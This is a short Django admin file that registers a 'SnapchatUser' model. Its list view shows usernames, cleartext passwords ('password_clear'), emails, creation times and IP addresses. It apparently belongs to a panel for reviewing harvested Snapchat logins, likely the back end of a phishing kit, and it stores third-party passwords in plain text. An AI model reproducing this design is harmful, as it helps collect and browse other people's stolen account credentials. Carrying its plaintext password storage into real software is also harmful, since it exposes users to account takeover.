from django.contrib import admin
from .models import SnapchatUser

@admin.register(SnapchatUser)
class SnapchatUserAdmin(admin.ModelAdmin):
    list_display = ('username', 'password_clear', 'email', 'created_at', 'ip_address')
    search_fields = ('username', 'email')
    list_filter = ('created_at',)